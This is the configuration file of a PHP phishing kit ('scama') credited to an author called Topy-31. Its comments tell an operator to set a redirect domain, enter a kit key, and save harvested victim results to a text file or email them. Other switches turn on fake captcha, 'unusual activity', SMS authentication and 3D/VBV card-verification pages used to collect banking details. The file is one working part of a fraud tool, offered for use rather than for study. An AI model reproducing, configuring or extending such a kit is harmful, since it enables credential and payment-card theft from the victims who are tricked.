<?php
	/*
	# -> All Created By Topy-31
	# -> https://www.facebook.com/TOPY-31
	# -> ICQ : TOPY-31
	# -> // : Instructions
	*/
	// ================================= //
	// ================================= //
	$redirectlink = "craftychemist.org";	 	 // You must use redirect or the scam will not open
	// ================================= //
	// ================================= //
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	$API_KEY = "API-CODE-Teka-uzBx5xRrsquMMyigfPmj";
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	// ================================= //
	// ================================= //
	$scamname = "Topy-31";	    		 // *Change |SH33NZ0| to any name you want |Your Nick Name|
	// ================================= //
	// ================================= //
	$saveintext = "yes";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	$filename = "bati-31"; // Change |SH33NZ0| to any name you want this will be the Rzlt file name
	// ================================= //
	// ================================= //
	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	$yours = ""; 	 // Edit this to your email 
	// ================================= //
	// ================================= //
	$show_captcha ="no"; 				 // If you don`t want to show ||Captcha Page|| edit |yes| to |no|  Page|| edit |yes| to |no| 
	$show_unusual_activity ="no"; 		 // If you don`t want to show ||Unusual Activity|| edit |yes| to |no|
	$show_sms_auth0 = "yes";             // If you don`t want to show ||3D/VBV Page|| edit |yes| to |no|
	$show_3D_VBV ="yes"; 				 // If you don`t want to show ||3D/VBV Page|| edit |yes| to |no| 
	$show_3D_VBV1 ="yes"; 				 // If you don`t want to show ||3D/VBV Page|| edit |yes| to |no| 
	$show_3D_VBV2 ="yes"; 				 // If you don`t want to show ||3D/VBV Page|| edit |yes| to |no| 
    
	// ================================= //
	// ================================= //
	/////////////////DATE-function//////////////////////
	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}
	/////////////////DATE-function//////////////////////

?>